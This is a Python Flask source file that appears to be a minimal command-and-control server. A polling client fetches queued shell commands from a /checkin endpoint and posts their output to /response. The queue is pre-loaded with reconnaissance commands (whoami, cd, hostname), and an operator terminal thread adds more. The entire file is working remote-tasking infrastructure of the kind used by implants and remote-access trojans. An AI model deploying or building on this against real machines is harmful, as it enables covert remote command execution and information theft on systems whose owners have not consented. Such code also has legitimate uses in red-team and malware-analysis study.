from flask import Flask, request, abort
import queue
import logging
from threading import Thread
from terminal import Terminal

 #only show error level logs so we don't get a bunch of http requests
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)
outgoingcommands = queue.Queue()

#put some commands in the queue to start with
for cmd in ["whoami", "cd", "hostname"]:
    outgoingcommands.put(cmd)

#this is the endpoint the client will poll to get commands
@app.route("/checkin", methods = ['GET'])
def checkin():
    try:
        return outgoingcommands.get_nowait()
    except:
        abort(404)

#this is the endpoint the client will post responses to
@app.route("/response", methods = ['POST'])
def response():
    print(request.data.decode("utf-8").strip())
    return "ok"

#spawn a thread to listen for commands from the terminal
terminal = Terminal()
terminal_thread = Thread(target = terminal.listen, args=(outgoingcommands,))
terminal_thread.daemon = True
terminal_thread.start()

if __name__ == '__main__':
    app.run(port = 5000, debug=False, host = "0.0.0.0")